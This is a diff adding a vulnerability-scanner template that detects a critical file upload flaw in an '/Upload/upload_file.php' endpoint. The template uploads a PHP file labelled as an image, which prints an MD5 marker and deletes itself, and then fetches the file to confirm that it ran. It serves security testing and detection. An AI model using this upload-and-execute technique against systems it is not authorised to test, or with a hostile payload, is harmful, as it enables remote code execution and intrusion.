@@ -1,0 +1,47 @@
+id: file-upload-vulnerability
+info:
+  name: File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects a file upload vulnerability by uploading a PHP file and verifying its execution.
+  reference:
+    - https://blog.csdn.net/qq_17754023/article/details/123174458
+
+variables:
+  rBoundary: "{{rand_text_alpha(20)}}"
+  rFilename: "{{rand_text_alpha(10)}}"
+  rPath: "{{rand_text_alpha(5)}}"
+  rContent: "{{rand_int(10000000, 40000000)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Upload/upload_file.php?l={{rPath}}"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----{{rBoundary}}"
+    body: |-
+      ------{{rBoundary}}
+      Content-Disposition: form-data; name="file"; filename="{{rFilename}}.php"
+      Content-Type: image/avif
+
+      <?php echo md5({{rContent}});unlink(__FILE__);?>
+      ------{{rBoundary}}--
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/Upload/{{rPath}}/{{rFilename}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(rContent)}}"
